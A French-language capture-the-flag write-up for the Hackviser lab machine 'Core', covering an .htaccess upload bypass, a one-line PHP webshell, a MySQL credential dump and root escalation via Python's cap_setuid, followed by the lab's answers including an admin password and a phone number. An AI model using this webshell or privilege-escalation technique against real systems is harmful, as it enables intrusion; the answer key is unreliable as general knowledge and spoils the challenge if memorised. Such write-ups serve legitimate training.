# Writeup CTF - Hackviser: Core

Ce document retrace le cheminement complet pour l'exploitation de la machine **Core** sur Hackviser.

## 1. Énumération et Accès Initial

Le site cible est un forum nommé **CoreForum** (`coreforum.hv`). L'exploration du site a révélé une page `add_topic.php` permettant l'upload de fichiers.

### Vulnérabilité d'Upload

Bien que les extensions `.php` soient filtrées, il est possible d'uploader des fichiers avec une double extension comme `.php.gif`. Par défaut, ces fichiers ne sont pas exécutés par le serveur web.

### Modification du `.htaccess`

En exploitant la faille d'upload pour envoyer un fichier nommé `.htaccess` contenant la directive suivante :

```apache
AddType application/x-httpd-php .gif
```

On force le serveur Apache à interpréter les fichiers `.gif` comme du PHP.

### Webshell

En uploadant ensuite un fichier `shell.php.gif` contenant :

```php
<?php system($_POST['attaque']); ?>
```

Nous obtenons une exécution de commande à distance (RCE) en tant qu'utilisateur `www-data`.

---

## 2. Extraction de Données (Base de Données)

L'exploration des fichiers de configuration (ou via l'historique/fichiers temporaires) a permis de trouver les identifiants MySQL.

* **Utilisateur** : `root`
* **Mot de passe** : `mUsQ6kQ6L86yRnzD`

En requêtant la base de données `hacker`, table `users` :

```bash
mysql -u root -pmUsQ6kQ6L86yRnzD hacker -e "SELECT * FROM users;"
```

Nous avons obtenu les informations suivantes :

* **Password pour admin** : `LrEVgETDEUDVAdCa`
* **Dernière IP de connexion (admin)** : *Je vous le laisse chercher* (Les commandes de dump complet ont été entravées par des instabilités système).

---

## 3. Élévation de Privilèges (Root)

### Le Rabbit Hole : `sudo iftop`

La commande `sudo -l` indique que `www-data` peut exécuter `/usr/sbin/iftop` sans mot de passe. Bien que `iftop` permette normalement un "shell escape" via la touche `!`, cette version semble patchée ou l'environnement restreint (absence de TTY stable) rend son exploitation très complexe et peu fiable.

### La faille réelle : Capabilities Python

Une recherche sur les privilèges étendus (*Capabilities*) a révélé une vulnérabilité majeure :

```bash
getcap -r / 2>/dev/null
# Résultat : /usr/bin/python3.9 cap_setuid=ep
```

Le binaire Python 3.9 possède la capacité `cap_setuid`, permettant à n'importe quel utilisateur de changer son UID pour celui de root.

### Exploitation Root

Utilisation de Python pour lire les fichiers protégés dans `/root` :

```bash
/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("cat /root/private.txt")'
```

---

## 4. Réponses aux Questions

### Who is the author of "Exploit Development"?

*Réponse* : **Je vous le laisse chercher** (Indice : Consultez les contenus des topics du forum).

### What is the password for the user account "admin"?

*Réponse* : **LrEVgETDEUDVAdCa**

### What is the last logged in IP address of the user "admin"?

*Réponse* : **Je vous le laisse chercher** (Indice : Table `users` dans la DB `hacker`).

### What is the domain address of the last website on the hackers target list?

*Réponse* : **gloophv.hv** (Trouvé dans `/root/domains.txt`).

### What is the phone number of the hacker named "Mateo Rodriguez"?

*Réponse* : **774-288-3197** (Trouvé dans `/root/private.txt`).

---
*Writeup généré par .*
